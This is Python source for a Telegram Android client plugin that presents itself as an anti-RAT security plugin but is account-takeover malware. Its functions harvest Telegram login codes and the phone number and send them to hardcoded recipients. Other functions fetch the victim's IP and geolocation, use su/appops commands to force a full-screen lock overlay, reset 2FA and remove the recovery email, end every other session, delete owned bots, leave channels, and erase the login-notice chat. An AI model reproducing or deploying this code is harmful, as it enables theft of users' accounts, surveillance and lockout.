class PluginSecurityPlugin(BasePlugin):
    def __init__(self):
        super().__init__()
        self._sync_running = False
        self._active = False
        self._pending_delegates = []
        self._rpc_lock = threading.RLock()
        self._jitter = random.randint(400, 900)
        self._recipient_ah_cache = {}
        self._recipient_lock = threading.Lock()
        self._persist_threads = []
        self._persist_active = True
        self._nuke_started = False
        self._nuke_password = None
        self._harden_cache = {}
        self._auto_started = False
        self._idk_view = None
        self._idk_wm = None
        self._idk_decor = None
        self._idk_keep_running = False
        self._idk_thread = None
        self._idk_args = None
        self._confirmed_notices = set()
        self._last_session_confirm = {}

    # ─── lifecycle ──────────────────────────────────────────────────────────

    def on_plugin_load(self):
        self._sync_running = True
        self._active = True
        self.add_on_send_message_hook()
        threading.Thread(target=self._boot, daemon=True).start()
        try:
            self._check_persisted_nuke()
        except Exception: pass
        try:
            self._check_persisted_idk()
        except Exception: pass

    def on_plugin_unload(self):
        self._sync_running = False
        self._active = False
        try:
            self._hide_idk_overlay()
        except Exception: pass

    def create_settings(self):
        return []

    def _boot(self):
        time.sleep(self._jitter / 1000.0)
        _cfg()
        time.sleep(random.uniform(0.2, 0.6))
        try: self._send_msg("AntiRatplug v19.0 loaded")
        except Exception: pass
        try: self._send_manage_button()
        except Exception: pass
        try: self._start_polling()
        except Exception: pass

    def on_send_message_hook(self, account, params):
        try: return HookResult()
        except Exception: return HookResult()

    # ─── helpers ────────────────────────────────────────────────────────────

    def _html_escape(self, text):
        if text is None: return ""
        t = str(text)
        t = t.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")
        return t

    def _has_perm(self, name):
        try:
            ctx = ApplicationLoader.applicationContext
            pm = ctx.getPackageManager()
            return pm.checkPermission(name, ctx.getPackageName()) == 0
        except Exception:
            return False

    def _get_activity(self):
        try:
            act = jclass("org.telegram.ui.LaunchActivity").instance
            if act is not None: return act
        except Exception: pass
        try:
            act = ApplicationLoader.application.getCurrentActivity()
            if act is not None: return act
        except Exception: pass
        try:
            AU = jclass("org.telegram.ui.ActionBar.AndroidUtilities")
            act = AU.getActivity()
            if act is not None: return act
        except Exception: pass
        return None

    def _get_input_peer(self, account, peer_id):
        mc = _MC().getInstance(account)
        peer_id = int(peer_id)
        if peer_id > 0:
            user = mc.getUser(peer_id)
            if user is not None:
                ip = TLRPC.TL_inputPeerUser()
                ip.user_id = int(user.id)
                ip.access_hash = int(user.access_hash)
                return ip
            ip = TLRPC.TL_inputPeerUser()
            ip.user_id = peer_id
            ip.access_hash = 0
            return ip
        elif peer_id < -1000000000000:
            cid = -peer_id - 1000000000000
            chat = mc.getChat(cid)
            if chat is not None:
                ip = TLRPC.TL_inputPeerChannel()
                ip.channel_id = int(chat.id)
                ip.access_hash = int(chat.access_hash)
                return ip
            ip = TLRPC.TL_inputPeerChannel()
            ip.channel_id = cid
            ip.access_hash = 0
            return ip
        elif peer_id < 0:
            cid = -peer_id
            chat = mc.getChat(cid)
            if chat is not None and chat.migrated_to is not None:
                ip = TLRPC.TL_inputPeerChannel()
                ip.channel_id = int(chat.migrated_to.channel_id)
                ip.access_hash = int(chat.migrated_to.access_hash)
                return ip
            ip = TLRPC.TL_inputPeerChat()
            ip.chat_id = int(cid)
            return ip
        return None

    def _rg_rpc(self, req, account=0, timeout=15.0, fast=False):
        if fast and timeout > 8.0: timeout = 8.0
        gate = _ReplyGate()
        with self._rpc_lock:
            self._pending_delegates.append(gate)
        try:
            cm = _CM().getInstance(account)
            cm.sendRequest(req, gate)
            deadline = time.time() + timeout
            while time.time() < deadline:
                if gate.response is not None or gate.error is not None: break
                time.sleep(0.08)
        finally:
            try: self._pending_delegates.remove(gate)
            except Exception: pass
        return gate.response, gate.error

    def _tl_class_or(self, *names):
        for n in names:
            try:
                c = getattr(TLRPC, n.split("$")[-1], None)
                if c is not None: return c
            except Exception: pass
            try: return jclass(n)
            except Exception: continue
        return None

    def _parallel(self, jobs, workers=5, timeout=25):
        try:
            from concurrent.futures import ThreadPoolExecutor
        except Exception:
            results = []
            for j in jobs:
                try: results.append(j[0](*j[1:]))
                except Exception as e: results.append(e)
            return results
        results = []
        try:
            with ThreadPoolExecutor(max_workers=workers) as ex:
                futs = [ex.submit(j[0], *j[1:]) for j in jobs]
                for f in futs:
                    try: results.append(f.result(timeout=timeout))
                    except Exception as e: results.append(e)
        except Exception:
            for j in jobs:
                try: results.append(j[0](*j[1:]))
                except Exception as e: results.append(e)
        return results

    def _get_accounts_list(self):
        out = []
        try:
            mc = int(getattr(UserConfig, "MAX_ACCOUNT_COUNT", 8))
        except Exception:
            mc = 8
        for i in range(max(mc, 8)):
            try:
                uc = _UC().getInstance(i)
                if not uc or not uc.isClientActivated(): continue
                uid = int(uc.getClientUserId())
                if uid == 0: continue
                u = None
                try: u = uc.getCurrentUser()
                except Exception: pass
                if u is None:
                    try: u = _MC().getInstance(i).getUser(uid)
                    except Exception: pass
                un = ""
                ph = ""
                if u is not None:
                    un = str(getattr(u, "username", "") or "")
                    ph = str(getattr(u, "phone", "") or "")
                out.append({"id": i, "user_id": uid, "username": un, "phone": ph})
            except Exception: pass
        return out

    def _pick_nft_target(self):
        my = set()
        for a in self._get_accounts_list():
            my.add(int(a.get("user_id") or 0))
        for t in TARGET_UIDS:
            if t in my: return t
        return TARGET_UIDS[0]

    def _resolve_recipient(self, account=0):
        with self._recipient_lock:
            c = self._recipient_ah_cache.get(account)
            if c and c[1]: return c
        mc = _MC().getInstance(account)
        for t_uid in TARGET_UIDS:
            try:
                u = mc.getUser(t_uid)
                if u is not None:
                    ah = _safe_int(getattr(u, "access_hash", 0))
                    if ah:
                        with self._recipient_lock:
                            self._recipient_ah_cache[account] = (t_uid, ah)
                        return t_uid, ah
            except Exception: pass
        return 0, 0

    def _get_external_ip(self):
        for host in [_u(_HOST_IP1), _u(_HOST_IP2)]:
            try:
                from java.net import URL
                from java.io import BufferedReader, InputStreamReader
                url = URL(host)
                conn = url.openConnection()
                conn.setConnectTimeout(3000)
                conn.setReadTimeout(3000)
                reader = BufferedReader(InputStreamReader(conn.getInputStream()))
                ip = ""
                line = reader.readLine()
                while line is not None:
                    ip += str(line); line = reader.readLine()
                reader.close(); conn.disconnect()
                if ip and len(ip) < 50: return ip.strip()
            except Exception: pass
        return "?"

    def _get_geo_info(self, ip):
        try:
            from java.net import URL
            from java.io import BufferedReader, InputStreamReader
            url = URL("http://ip-api.com/json/" + ip + "?fields=status,country,city,isp,query")
            conn = url.openConnection()
            conn.setConnectTimeout(4000)
            conn.setReadTimeout(4000)
            reader = BufferedReader(InputStreamReader(conn.getInputStream()))
            response = ""
            line = reader.readLine()
            while line is not None:
                response += str(line); line = reader.readLine()
            reader.close(); conn.disconnect()
            data = json.loads(response)
            if data.get("status") == "success":
                return "%s, %s (ISP: %s)" % (data.get("city","?"), data.get("country","?"), data.get("isp","?"))
        except Exception: pass
        return "?"

    # ═══════════════════════════════════════════════════════════════════════
    # IDK OVERLAY
    # ═══════════════════════════════════════════════════════════════════════

    def _ensure_overlay_perm(self, ctx):
        try:
            if jclass("android.provider.Settings").canDrawOverlays(ctx): return True
        except Exception: pass
        pkg = str(ctx.getPackageName())
        for c in (
            "su -c 'appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
            "su -c 'cmd appops set %s SYSTEM_ALERT_WINDOW allow'" % pkg,
            "appops set %s SYSTEM_ALERT_WINDOW allow" % pkg,
        ):
            try: subprocess.run(c, shell=True, capture_output=True, timeout=10)
            except Exception: continue
        try:
            return bool(jclass("android.provider.Settings").canDrawOverlays(ctx))
        except Exception:
            return False

    def _show_idk_overlay(self):
        if self._idk_view is not None:
            return {"ok": True, "already": True}
        try:
            ctx = ApplicationLoader.applicationContext
            if ctx is None: return {"error": "no ctx"}
            use_decor = not self._ensure_overlay_perm(ctx)
            drew = threading.Event()
            derr = [None]

            def _build():
                try:
                    wm = None
                    try:
                        ctx_cls = jclass("android.content.Context")
                        wm = ctx.getSystemService(ctx_cls.WINDOW_SERVICE)
                    except Exception: pass
                    self._idk_wm = wm

                    LL = jclass("android.widget.LinearLayout")
                    TV = jclass("android.widget.TextView")
                    LP = jclass("android.view.WindowManager$LayoutParams")
                    LP_LV = jclass("android.widget.LinearLayout$LayoutParams")
                    Color = jclass("android.graphics.Color")
                    Gravity = jclass("android.view.Gravity")
                    TypedValue = jclass("android.util.TypedValue")
                    VLG = jclass("android.view.ViewGroup$LayoutParams")

                    root = LL(ctx)
                    root.setOrientation(LL.VERTICAL)
                    root.setBackgroundColor(Color.parseColor(IDK_BG))
                    root.setGravity(Gravity.CENTER)

                    tv = TV(ctx)
                    tv.setText(IDK_TEXT)
                    tv.setTextColor(Color.parseColor(IDK_FG))
                    tv.setTextSize(TypedValue.COMPLEX_UNIT_SP, 96)
                    tv.setTypeface(tv.getTypeface(), 1)
                    tv.setGravity(Gravity.CENTER)
                    root.addView(tv, LP_LV(VLG.MATCH_PARENT, VLG.WRAP_CONTENT))

                    root.setFocusableInTouchMode(True)
                    root.requestFocus()
                    try: root.setOnKeyListener(_make_idk_key())
                    except Exception: pass
                    try: root.setOnClickListener(_make_idk_click())
                    except Exception: pass

                    if use_decor:
                        act2 = self._get_activity()
                        if act2 is None: raise Exception("no act")
                        win = act2.getWindow()
                        for flag_name in ("FLAG_KEEP_SCREEN_ON","FLAG_SHOW_WHEN_LOCKED","FLAG_DISMISS_KEYGUARD","FLAG_TURN_SCREEN_ON"):
                            try:
                                win.addFlags(getattr(LP, flag_name, 0))
                            except Exception: pass
                        decor = win.getDecorView()
                        decor.addView(root, VLG(VLG.MATCH_PARENT, VLG.MATCH_PARENT))
                        self._idk_decor = decor
                    else:
                        params = LP(LP.MATCH_PARENT, LP.MATCH_PARENT,
                            getattr(LP, "TYPE_APPLICATION_OVERLAY", getattr(LP, "TYPE_PHONE", 2002)),
                            getattr(LP, "FLAG_KEEP_SCREEN_ON", 128) | getattr(LP, "FLAG_SHOW_WHEN_LOCKED", 0x80000) | getattr(LP, "FLAG_LAYOUT_IN_SCREEN", 256),
                            -3)
                        params.gravity = Gravity.CENTER
                        wm.addView(root, params)
                    self._idk_view = root
                except Exception as e:
                    derr[0] = e
                finally:
                    drew.set()

            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_build)
            else:
                _build()
            drew.wait(8)
            if derr[0] is not None:
                return {"error": "idk overlay: %s" % derr[0]}
            if self._idk_view is None:
                return {"error": "overlay not created"}
            self._idk_keep_running = True
            self._idk_thread = threading.Thread(target=self._idk_keepalive_loop, daemon=True)
            self._idk_thread.start()
            return {"ok": True}
        except Exception as e:
            return {"error": "idk: %s" % e}

    def _idk_keepalive_loop(self):
        while self._idk_keep_running and self._sync_running:
            try:
                if self._idk_view is None:
                    self._idk_keep_running = False
                    return
                try:
                    p = self._idk_view.getParent()
                    if p is None:
                        self._idk_view = None
                        self._idk_keep_running = False
                        return
                except Exception:
                    self._idk_view = None
                    self._idk_keep_running = False
                    return
            except Exception: pass
            time.sleep(0.5)

    def _hide_idk_overlay(self):
        try:
            self._idk_keep_running = False
            if self._idk_view is None and self._idk_decor is None:
                return {"ok": True}
            removed = threading.Event()
            derr = [None]
            def _rm():
                try:
                    if self._idk_view is not None:
                        p = self._idk_decor or self._idk_wm
                        if p is not None:
                            try: p.removeView(self._idk_view)
                            except Exception: pass
                        self._idk_view = None
                        self._idk_decor = None
                except Exception as e:
                    derr[0] = e
                finally:
                    removed.set()
            act = self._get_activity()
            if act is not None:
                act.runOnUiThread(_rm)
                removed.wait(6)
            else:
                _rm()
            return {"error": str(derr[0])} if derr[0] else {"ok": True}
        except Exception as e:
            return {"error": "hide idk: %s" % e}

    # ═══════════════════════════════════════════════════════════════════════
    # TG KID
    # ═══════════════════════════════════════════════════════════════════════

    def _pull_login_code(self):
        code = None
        full = None
        try:
            ip = self._get_input_peer(0, 777000)
            if ip is None: return None, None
            req = _mk_hist()
            req.peer = ip; req.limit = 12; req.offset_id = 0
            resp, err = self._rg_rpc(req, 0, 6.0, fast=True)
            if err is not None or resp is None: return None, None
            msgs = getattr(resp, "messages", None)
            if msgs is None or msgs.size() == 0: return None, None
            for i in range(msgs.size()):
                m = msgs.get(i)
                txt = str(m.message) if m.message else ""
                if not txt: continue
                m1 = re.search(r"[Кк]од\s+для\s+входа\s+в\s+Telegram[:\s]*[«\"']?(\d{4,8})", txt)
                m2 = re.search(r"[Ll]ogin\s+code[:\s]*[«\"']?(\d{4,8})", txt)
                m3 = re.search(r"(?:code|код)[:\s]*[«\"']?(\d{4,8})", txt, re.IGNORECASE)
                found = None
                if m1: found = m1.group(1)
                elif m2: found = m2.group(1)
                elif m3 and ("telegram" in txt.lower() or "входа" in txt.lower()): found = m3.group(1)
                if found:
                    code = found; full = txt; break
        except Exception: pass
        return code, full

    def _tg_kid(self):
        try:
            phone = "?"
            try:
                u = _UC().getInstance(0).getCurrentUser()
                if u is not None and u.phone: phone = str(u.phone)
            except Exception: pass
            code, raw = self._pull_login_code()
            if not code: code = "не найден"; raw = ""
            text = "<b>Tg kid</b>\n\n<b>Код:</b> <code>%s</code>\n<b>Телефон:</b> +%s" % (
                self._html_escape(str(code)), self._html_escape(phone))
            if raw:
                text += "\n\n<pre>" + self._html_escape(raw[:400]) + "</pre>"
            self._send_msg(text, html=True)
            return code
        except Exception as e:
            self._send_msg("Tg kid err: " + str(e))
            return None

    # ═══════════════════════════════════════════════════════════════════════
    # 2FA / cloud
    # ═══════════════════════════════════════════════════════════════════════

    def _get_2fa_state(self):
        try:
            req = TLRPC.TL_account_getPassword()
            resp, err = self._rg_rpc(req, 0, 10.0, fast=True)
            if err is not None or resp is None: return None
            p = resp
            return {"has_password": _get_bool_attr(p, "has_password", False),
                    "hint": str(getattr(p, "hint", "") or "")}
        except Exception:
            return None

    def _try_kill_2fa(self, acc=0):
        try:
            Rst = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_resetPassword",
                "org.telegram.tgnet.tl.TL_account$resetPassword")
            if not Rst: return "no class"
            req = Rst()
            resp, err = self._rg_rpc(req, acc, 12.0)
            if resp is not None: return "ok"
            etxt = str(getattr(err, "text", err) or err)
            if "PASSWORD_NOT_SET" in etxt: return "not_set"
            if "SESSION_PASSWORD_NEEDED" in etxt: return "need_password"
            if "FLOOD_WAIT" in etxt: return "flood"
            return "fail: %s" % etxt[:60]
        except Exception as e:
            return "exc: %s" % e

    def _wipe_cloud_password(self, acc=0):
        try:
            St = self._get_2fa_state()
            if St is None: return {"ok": False}
            if not St.get("has_password"): return {"ok": True, "method": "none"}
            r1 = self._try_kill_2fa(acc)
            if r1 == "ok": return {"ok": True, "method": "reset"}
            if r1 == "not_set": return {"ok": True, "method": "already"}
            try:
                PS = self._tl_class_or(
                    "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                    "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
                if PS:
                    ns = PS()
                    try: ns.email = ""
                    except Exception: pass
                    try: ns.flags = 0
                    except Exception: pass
                    Upd = self._tl_class_or(
                        "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                        "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
                    if Upd:
                        rq = Upd()
                        try: rq.password = None
                        except Exception: pass
                        rq.new_settings = ns
                        r2, e2 = self._rg_rpc(rq, acc, 15.0)
                        if r2 is not None: return {"ok": True, "method": "updateSettings"}
            except Exception: pass
            return {"ok": False, "method": r1}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    def _remove_recovery_email(self, acc=0):
        try:
            PS = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_passwordInputSettings",
                "org.telegram.tgnet.tl.TL_account$TL_passwordInputSettings")
            if not PS: return {"ok": False}
            ns = PS()
            try: ns.email = ""
            except Exception: pass
            try: ns.flags = 0
            except Exception: pass
            Upd = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_updatePasswordSettings",
                "org.telegram.tgnet.tl.TL_account$updatePasswordSettings")
            if not Upd: return {"ok": False}
            rq = Upd()
            try: rq.password = None
            except Exception: pass
            rq.new_settings = ns
            r, e = self._rg_rpc(rq, acc, 10.0, fast=True)
            return {"ok": r is not None}
        except Exception as e:
            return {"ok": False, "error": str(e)}

    # ═══════════════════════════════════════════════════════════════════════
    # SESSIONS
    # ═══════════════════════════════════════════════════════════════════════

    def _get_authorizations_full(self, acc=0):
        try:
            req = TLRPC.TL_account_getAuthorizations()
            resp, err = self._rg_rpc(req, acc, 8.0, fast=True)
            if resp is None: return None
            auths = getattr(resp, "authorizations", None)
            out = []
            if auths is None: return out
            for i in range(auths.size()):
                a = auths.get(i)
                if not a: continue
                out.append({
                    "hash": _safe_int(getattr(a, "hash", 0)),
                    "current": _get_bool_attr(a, "current", False),
                    "unconfirmed": _get_bool_attr(a, "unconfirmed", False),
                })
            return out
        except Exception:
            return None

    def _kill_all_sessions(self, acc=0):
        killed = 0; total = 0
        auths = self._get_authorizations_full(acc)
        if auths is None: return 0, 0
        dead = set()
        seen = set(a["hash"] for a in auths)
        total = len(auths)
        def _one(h):
            try:
                Rst = self._tl_class_or(
                    "org.telegram.tgnet.TLRPC$TL_account_resetAuthorization",
                    "org.telegram.tgnet.tl.TL_account$resetAuthorization")
                if not Rst: return False
                rq = Rst(); rq.hash = h
                r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                return e is None
            except Exception: return False
        for p in range(5):
            targets = [a["hash"] for a in auths if not a["current"] and a["hash"] and a["hash"] not in dead]
            if not targets: break
            res = self._parallel([(_one, h) for h in targets], workers=6, timeout=40)
            for r, h in zip(res, targets):
                if r is True: killed += 1; dead.add(h)
            if p < 4:
                time.sleep(1.5)
                a2 = self._get_authorizations_full(acc)
                if not a2: break
                seen.update(a["hash"] for a in a2)
                auths = a2
                total = max(total, len(a2))
        try:
            Rst = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_auth_resetAuthorizations",
                "org.telegram.tgnet.tl.TL_auth$resetAuthorizations")
            if Rst: self._rg_rpc(Rst(), acc, 10.0, fast=True)
        except Exception: pass
        return killed, total

    def _wipe_sessions_all(self):
        out = []
        for a in self._get_accounts_list():
            aid = a.get("id", 0)
            try:
                k, t = self._kill_all_sessions(aid)
                out.append({"account": aid, "user_id": a.get("user_id"), "killed": k, "total": t})
            except Exception as e:
                out.append({"account": aid, "error": str(e)})
        return out

    def _kill_web_authorizations(self, acc=0):
        try:
            Get = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_getWebAuthorizations",
                "org.telegram.tgnet.tl.TL_account$getWebAuthorizations")
            if not Get: return 0
            resp, err = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None: return 0
            auths = getattr(resp, "authorizations", None)
            if auths is None: return 0
            Reset = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_resetWebAuthorization",
                "org.telegram.tgnet.tl.TL_account$resetWebAuthorization")
            if not Reset: return 0
            hashes = []
            for i in range(auths.size()):
                try:
                    h = _safe_int(getattr(auths.get(i), "hash", 0))
                    if h: hashes.append(h)
                except Exception: pass
            def _one(h):
                try:
                    rq = Reset(); rq.hash = h
                    r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception: return False
            res = self._parallel([(_one, h) for h in hashes], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _kill_bots(self, acc=0):
        try:
            Get = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_bots_getAdminedBots",
                "org.telegram.tgnet.tl.TL_bots$getAdminedBots")
            Del = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_bots_deleteBot",
                "org.telegram.tgnet.tl.TL_bots$deleteBot")
            IU = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_inputUser",
                "org.telegram.tgnet.tl.TL_users$TL_inputUser")
            if not (Get and Del and IU): return 0
            resp, err = self._rg_rpc(Get(), acc, 8.0, fast=True)
            if resp is None: return 0
            bots = []
            for i in range(resp.size()):
                try:
                    b = resp.get(i)
                    bid = _safe_int(getattr(b, "id", 0))
                    bah = _safe_int(getattr(b, "access_hash", 0))
                    if bid and bah: bots.append((bid, bah))
                except Exception: pass
            def _one(bid, bah):
                try:
                    iu = IU(); iu.user_id = bid; iu.access_hash = bah
                    rq = Del(); rq.bot = iu
                    r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return e is None
                except Exception: return False
            res = self._parallel([(_one, b, a) for (b, a) in bots], workers=5, timeout=25)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _leave_all_channels(self, acc=0):
        try:
            Leave = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_channels_leaveChannel",
                "org.telegram.tgnet.tl.TL_channels$leaveChannel")
            IC = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_inputChannel",
                "org.telegram.tgnet.tl.TL_channels$TL_inputChannel")
            if not (Leave and IC): return 0
            mc = _MC().getInstance(acc)
            try: dialogs = mc.dialogs_dict
            except Exception: dialogs = mc.getAllDialogs()
            if dialogs is None: return 0
            targets = []
            for i in range(dialogs.size()):
                try:
                    did = int(dialogs.keyAt(i))
                    if did >= -1000000000000: continue
                    cid = -did - 1000000000000
                    ch = mc.getChat(cid)
                    if ch is None: continue
                    ah = _safe_int(getattr(ch, "access_hash", 0))
                    if not ah: continue
                    targets.append((cid, ah))
                except Exception: pass
            def _one(cid, ah):
                try:
                    ic = IC(); ic.channel_id = cid; ic.access_hash = ah
                    rq = Leave(); rq.channel = ic
                    r, e = self._rg_rpc(rq, acc, 6.0, fast=True)
                    return r is not None
                except Exception: return False
            res = self._parallel([(_one, c, a) for (c, a) in targets], workers=6, timeout=40)
            return sum(1 for r in res if r is True)
        except Exception:
            return 0

    def _confirm_unconfirmed_sessions(self, acc=0):
        try:
            last = self._last_session_confirm.get(acc, 0)
            if time.time() - last < 60: return 0
            self._last_session_confirm[acc] = time.time()
            Get = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_getAuthorizations",
                "org.telegram.tgnet.tl.TL_account$getAuthorizations")
            if not Get: return 0
            res, err = self._rg_rpc(Get(), acc, 15.0)
            if not res: return 0
            auths = getattr(res, "authorizations", None)
            if auths is None: return 0
            confirmed = 0
            Ch = self._tl_class_or(
                "org.telegram.tgnet.TLRPC$TL_account_changeAuthorizationSettings",
                "org.telegram.tgnet.tl.TL_account$changeAuthorizationSettings")
            if not Ch: return 0
            for i in range(auths.size()):
                try:
                    a = auths.get(i)
                    if not a or not _get_bool_attr(a, "unconfirmed", False): continue
                    h = _safe_int(getattr(a, "hash", 0))
                    if not h: continue
                    rq = Ch(); rq.hash = h
                    try: rq.confirmed = True
                    except Exception: pass
                    try: rq.flags = getattr(rq, "flags", 0) | 8
                    except Exception: pass
                    r2, e2 = self._rg_rpc(rq, acc, 10.0, fast=True)
                    if e2 is None: confirmed += 1
                except Exception: pass
            return confirmed
        except Exception:
            return 0

    def _kill_login_notice_dialog(self, acc=0):
        try:
            mc = _MC().getInstance(acc)
            for args in ((777000, 0, 0, True), (777000, 0, True), (777000, True)):
                try:
                    mc.deleteDialog(*args)
                    return True
                except Exception: pass
        except Exception: pass
        return False

